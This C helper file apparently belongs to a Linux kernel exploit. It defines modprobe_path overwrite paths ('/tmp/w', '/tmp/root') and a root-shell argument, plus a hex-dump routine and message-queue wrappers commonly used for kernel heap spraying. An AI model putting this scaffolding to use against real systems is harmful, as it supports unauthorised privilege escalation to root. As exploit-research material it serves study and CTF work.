#include "util.h"

char *modprobe_win = "/tmp/w";
char *modprobe_trigger = "/tmp/root";
char *root_argv[] = {"-p", NULL};

void hexprint(char *buffer, unsigned int bytes) 
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2) {
        printf("0x%04x: 0x%016llx 0x%016llx\n", (i * 0x8), ((unsigned long long*)buffer)[i], ((unsigned long long*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

int32_t make_queue(key_t key, int msgflg) 
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

ssize_t get_msg_no_err(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) 
{
    ssize_t ret;
    ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    return ret;
}

ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) 
{
    ssize_t ret;
    ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    if (ret < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return ret;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg) 
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}
